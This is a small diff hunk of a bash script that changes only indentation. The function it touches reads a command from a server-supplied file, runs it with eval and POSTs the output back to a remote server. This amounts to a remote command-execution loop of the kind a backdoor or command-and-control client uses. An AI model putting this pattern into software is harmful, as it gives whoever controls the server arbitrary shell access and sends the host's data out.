@@ -16,13 +16,13 @@ function getFromServer () {
 
 function postToServer () {
 
-		command=$(jq -r '.command' tmp.txt)
-		eval $command |& tee return.txt 
+	command=$(jq -r '.command' tmp.txt)
+	eval $command |& tee return.txt 
 
-		rawdata=$(cat return.txt)
-		data=$(jq -n "{data:\"$rawdata\"}")
-		echo $data > data.json
-		curl -d "@data.json" -H "Content-Type: application/json" -X POST $server
+	rawdata=$(cat return.txt)
+	data=$(jq -n "{data:\"$rawdata\"}")
+	echo $data > data.json
+	curl -d "@data.json" -H "Content-Type: application/json" -X POST $server
 }
 
 
